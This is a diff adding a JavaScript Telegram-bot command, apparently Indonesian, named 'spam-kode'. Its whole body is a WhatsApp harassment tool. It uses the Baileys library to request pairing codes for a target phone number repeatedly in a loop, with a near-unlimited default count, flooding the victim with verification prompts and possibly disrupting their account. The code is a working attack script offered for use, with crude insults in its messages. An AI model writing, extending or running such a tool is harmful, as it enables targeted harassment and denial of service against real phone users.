@@ -1,0 +1,65 @@
+const fs = require("fs");
+const path = require("path");
+
+module.exports = {
+  name: "spam-kode",
+  category: "owner",
+  description: "Spam pairing code WhatsApp (owner only)",
+  async execute(bot, msg, args) {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id.toString();
+    const MAIN_OWNER_ID = "6020118432";
+
+    const ownerFile = path.join(__dirname, "../owner.json");
+    if (!fs.existsSync(ownerFile)) fs.writeFileSync(ownerFile, JSON.stringify({ owners: [] }, null, 2));
+    const raw = JSON.parse(fs.readFileSync(ownerFile, "utf-8"));
+    const ownerList = raw.owners || [];
+    if (userId !== MAIN_OWNER_ID && !ownerList.includes(userId)) return bot.sendMessage(chatId, "❌ Owner doang bego");
+
+    if (!args[0]) return bot.sendMessage(chatId, `⚠️ *Example:* /spam-pairing +628xxxxxx|150`);
+
+    const text = args.join(" ");
+    let [peenis, pepekk] = text.includes('|') ? text.split("|") : [text, "9999999999999999999999999999999999"];
+    let target = peenis.replace(/[^0-9]/g, '').trim();
+    let count = parseInt(pepekk) || 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999;
+
+    if (!target || target.length < 10) return bot.sendMessage(chatId, "❌ Nomor target tidak valid");
+
+    try {
+      let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
+      let pino = require("pino");
+
+      const authPath = './db/spam-pairing/';
+      if (!fs.existsSync(authPath)) fs.mkdirSync(authPath, { recursive: true });
+
+      let { state } = await useMultiFileAuthState(authPath);
+      let { version } = await fetchLatestBaileysVersion();
+      let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }), printQRInTerminal: false });
+
+      const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+      bot.sendMessage(chatId, `🚀 Memulai spam pairing ke ${target} sebanyak ${count}x...`);
+
+      let successCount = 0;
+      let failCount = 0;
+      for (let i = 0; i < count; i++) {
+        try {
+          await sleep(1500);
+          let prc = await sucked.requestPairingCode(target);
+          successCount++;
+          console.log(`Success Spam Pairing Code - Number: ${target} - Code: ${prc} - Attempt: ${i + 1}`);
+        } catch (e) {
+          failCount++;
+          console.log(`Failed Attempt ${i + 1}:`, e?.message || e);
+        }
+      }
+
+      await sleep(15000);
+      if (sucked && typeof sucked.end === 'function') sucked.end();
+
+      bot.sendMessage(chatId, `✅ Selesai\n📱 Target: ${target}\n✅ Berhasil: ${successCount}\n❌ Gagal: ${failCount}\n🔢 Total: ${successCount + failCount}/${count}`);
+    } catch (error) {
+      console.error('Spam pairing error:', error);
+      bot.sendMessage(chatId, `❌ Error: ${error.message || error}`);
+    }
+  },
+};
